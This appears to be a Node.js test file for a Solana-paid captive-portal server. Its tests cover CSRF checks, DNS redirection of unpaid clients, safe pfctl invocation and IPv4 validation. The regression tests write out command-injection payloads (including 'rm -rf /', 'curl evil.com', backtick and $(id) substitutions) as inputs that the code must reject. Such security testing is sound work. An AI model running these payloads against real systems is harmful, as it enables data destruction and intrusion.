"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const path = require("path");

const {
  buildPortalApp,
  generateCsrfToken,
  isValidClientIP,
  makeDnsHandler,
  makePfHelpers,
  safeTokenEqual,
  startApp,
} = require("./_test-portal");

const PORTAL_SOURCE = fs.readFileSync(
  path.join(__dirname, "..", "server.js"),
  "utf8"
);

// ─── Sanity: the test harness mirrors the real production constants ──────────

test("test harness mirrors the production IPv4 regex (catches accidental drift)", () => {
  // If this assertion ever fires, server.js's regex changed and the harness
  // must follow.  The regex is the only line of defence between user-supplied
  // IPs and `pfctl ... add <ip>` execution.
  assert.match(
    PORTAL_SOURCE,
    /IPV4_OCTET_RE = \/\^\(\?:25\[0-5\]\|2\[0-4\]\\d\|1\\d\\d\|\[1-9\]\?\\d\)\$\//,
    "captive-portal/server.js must define the same IPV4_OCTET_RE the harness uses"
  );
});

test("test harness mirrors the production execFile-based pfctlExec", () => {
  // Production must use execFile (no shell) and pass argv items separately.
  assert.match(
    PORTAL_SOURCE,
    /execFile\("sudo", \["pfctl", \.\.\.args\]/,
    "pfctl must be invoked via execFile with array argv"
  );
  assert.ok(
    !/exec\(`sudo pfctl/.test(PORTAL_SOURCE),
    "production must not use string-form exec() for pfctl (shell injection risk)"
  );
});

test("test harness mirrors the production CSRF guard on /payment-finalize", () => {
  assert.match(PORTAL_SOURCE, /if \(!csrfToken\) {[\s\S]*?status\(403\)/);
  assert.match(PORTAL_SOURCE, /safeTokenEqual\(pending\.csrfToken, csrfToken\)/);
});

// ─── Core tests required by Prompt 8 ─────────────────────────────────────────

test("GET /payment-request returns reference, persists in pendingPayments", async (t) => {
  const pendingPayments = new Map();
  // Stub the control API: return a 402 challenge like production does.
  const fetchImpl = async (url, init) => {
    assert.match(url, /\/x402\/sessions\/purchase$/);
    const body = JSON.parse(init.body);
    assert.equal(body.minutes, 7);
    assert.equal(body.listingId, "local-hotspot");
    return {
      status: 402,
      json: async () => ({
        x402Version: 1,
        error: "payment_required",
        accepts: [
          {
            scheme: "exact",
            network: "solana-devnet",
            asset: "SOL",
            amount: "7000000",
            payTo: "5oNDL3swdJJF1g9DzJiZ4ynHXgszjAEpUkxVYejchzrY",
            memo: "netra:test-ref",
            description: "Buy hotspot access programmatically with Solana.",
            extra: {
              reference: "test-ref-abc123",
              listingId: "local-hotspot",
              minutes: 7,
              action: "purchase",
              tier: "standard",
            },
          },
        ],
        paymentContext: { reference: "test-ref-abc123", retryHeader: "Payment-Signature" },
      }),
    };
  };
  const app = buildPortalApp({ pendingPayments, fetchImpl });
  const harness = await startApp(app);
  t.after(() => harness.close());

  const res = await fetch(`${harness.baseUrl}/payment-request?minutes=7`);
  assert.equal(res.status, 200);
  const body = await res.json();

  assert.equal(body.reference, "test-ref-abc123");
  assert.equal(body.minutes, 7);
  assert.ok(body.csrfToken, "csrfToken must be issued");
  assert.match(body.url, /^solana:/);

  // pendingPayments MUST hold the entry keyed by reference.
  assert.ok(pendingPayments.has("test-ref-abc123"));
  const stored = pendingPayments.get("test-ref-abc123");
  assert.equal(stored.minutes, 7);
  assert.equal(stored.csrfToken, body.csrfToken);
  assert.equal(stored.activated, false);
});

test("POST /payment-finalize without CSRF token returns 403", async (t) => {
  const pendingPayments = new Map();
  const reference = "ref-no-csrf";
  pendingPayments.set(reference, {
    ip: "192.168.2.5",
    minutes: 10,
    listingId: "local-hotspot",
    csrfToken: generateCsrfToken(),
    created_at: Date.now(),
    activated: false,
  });

  const app = buildPortalApp({
    pendingPayments,
    fetchImpl: async () => ({ status: 500, json: async () => ({ error: "should not be called" }) }),
  });
  const harness = await startApp(app);
  t.after(() => harness.close());

  // Missing csrfToken entirely → 403.
  const missing = await fetch(`${harness.baseUrl}/payment-finalize`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ reference, signature: "fake-sig" }),
  });
  assert.equal(missing.status, 403);
  assert.deepEqual(await missing.json(), { error: "csrfToken required" });

  // Wrong csrfToken → 403.
  const wrong = await fetch(`${harness.baseUrl}/payment-finalize`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ reference, signature: "fake-sig", csrfToken: "wrong-token" }),
  });
  assert.equal(wrong.status, 403);
  assert.deepEqual(await wrong.json(), { error: "csrfToken invalid" });

  // Reference must still be unactivated — bad CSRF must not flip the flag.
  assert.equal(pendingPayments.get(reference).activated, false);

  // Sanity: correct csrfToken succeeds.
  const stored = pendingPayments.get(reference);
  const ok = await fetch(`${harness.baseUrl}/payment-finalize`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ reference, signature: "fake-sig", csrfToken: stored.csrfToken }),
  });
  assert.equal(ok.status, 200);
  assert.equal((await ok.json()).paid, true);
});

test("DNS handler returns PORTAL_IP for arbitrary domains during prepay phase", async () => {
  const PORTAL_IP = "192.168.2.1";
  const handler = makeDnsHandler({
    portalIp: PORTAL_IP,
    paidIps: new Set(), // unpaid client
    allowlist: new Set(), // no exemptions
  });

  const responses = [];
  await handler({
    request: { questions: [{ name: "captive.apple.com", type: 1 /* A */ }] },
    clientIP: "192.168.2.50", // not in paidIps
    send: (r) => responses.push(r),
  });
  await handler({
    request: { questions: [{ name: "facebook.com", type: 1 }] },
    clientIP: "192.168.2.50",
    send: (r) => responses.push(r),
  });
  await handler({
    request: { questions: [{ name: "anything.example", type: 1 }] },
    clientIP: "192.168.2.50",
    send: (r) => responses.push(r),
  });

  assert.equal(responses.length, 3);
  for (const resp of responses) {
    assert.equal(resp.answers.length, 1);
    assert.equal(resp.answers[0].address, PORTAL_IP);
    assert.equal(resp.answers[0].type, 1);
  }

  // AAAA must be NXDOMAIN (rcode 3) so devices fall back to IPv4.
  const aaaaResponses = [];
  await handler({
    request: { questions: [{ name: "captive.apple.com", type: 28 /* AAAA */ }] },
    clientIP: "192.168.2.50",
    send: (r) => aaaaResponses.push(r),
  });
  assert.equal(aaaaResponses[0].header.rcode, 3);
  assert.equal(aaaaResponses[0].answers.length, 0);
});

test("pfAdd is called with shell-safe arguments only (no shell, ip is its own argv)", async () => {
  const calls = [];
  const execFileSpy = (command, args, callback) => {
    calls.push({ command, args });
    callback(null, "", "");
  };
  const { pfAdd } = makePfHelpers({ execFileSpy });

  await pfAdd("192.168.2.42");
  assert.equal(calls.length, 2, "pfAdd must run two pfctl ops (anchor + nat)");
  for (const call of calls) {
    assert.equal(call.command, "sudo", "must spawn `sudo` directly, not via shell");
    assert.ok(Array.isArray(call.args), "execFile argv must be an array, not a string");
    // The IP MUST be its own argv element. Concatenating into a string would
    // permit `192.168.2.42; rm -rf /` style injection.
    assert.equal(call.args[call.args.length - 1], "192.168.2.42");
    assert.ok(call.args.includes("pfctl"));
    // No shell metacharacters anywhere in the argv (sanity).
    for (const arg of call.args) {
      assert.ok(
        !/[;&|`$<>]/.test(String(arg)),
        `argv element must not contain shell metacharacters: ${JSON.stringify(arg)}`
      );
    }
  }
});

test("pfAdd rejects malformed IPs before invoking execFile (command-injection regression)", async () => {
  const calls = [];
  const execFileSpy = (command, args, callback) => {
    calls.push({ command, args });
    callback(null, "", "");
  };
  const { pfAdd } = makePfHelpers({ execFileSpy });

  // Classic injection payloads — must NOT reach execFile.
  await pfAdd("192.168.2.42; rm -rf /");
  await pfAdd("192.168.2.42 && curl evil.com");
  await pfAdd("`whoami`");
  await pfAdd("$(id)");
  await pfAdd("999.0.0.1"); // out-of-range octet
  await pfAdd("not-an-ip");
  await pfAdd("");
  await pfAdd(null);
  await pfAdd(undefined);
  await pfAdd(["192.168.2.42"]); // wrong type

  assert.equal(
    calls.length,
    0,
    "execFile must not be invoked for any malformed/non-IPv4 input"
  );
});

test("isValidClientIP accepts the full IPv4 range and rejects edge cases", () => {
  // Acceptance
  assert.equal(isValidClientIP("0.0.0.0"), true);
  assert.equal(isValidClientIP("1.2.3.4"), true);
  assert.equal(isValidClientIP("192.168.2.42"), true);
  assert.equal(isValidClientIP("255.255.255.255"), true);
  assert.equal(isValidClientIP("10.0.0.1"), true);

  // Rejection
  assert.equal(isValidClientIP("256.0.0.1"), false);
  assert.equal(isValidClientIP("192.168.2"), false);
  assert.equal(isValidClientIP("192.168.2.42.5"), false);
  assert.equal(isValidClientIP(" 192.168.2.42"), false);
  assert.equal(isValidClientIP("192.168.2.42 "), false);
  assert.equal(isValidClientIP("192.168.2.42; rm -rf /"), false);
  assert.equal(isValidClientIP("192.168.2.42\n"), false);
  assert.equal(isValidClientIP(""), false);
  assert.equal(isValidClientIP(null), false);
  assert.equal(isValidClientIP(undefined), false);
  assert.equal(isValidClientIP(123), false);
});

test("safeTokenEqual is constant-time and length-aware", () => {
  const a = generateCsrfToken();
  assert.equal(safeTokenEqual(a, a), true);
  assert.equal(safeTokenEqual(a, a + "x"), false, "different lengths must mismatch");
  assert.equal(safeTokenEqual(a, "X" + a.slice(1)), false);
  assert.equal(safeTokenEqual(null, "x"), false);
  assert.equal(safeTokenEqual("x", null), false);
});
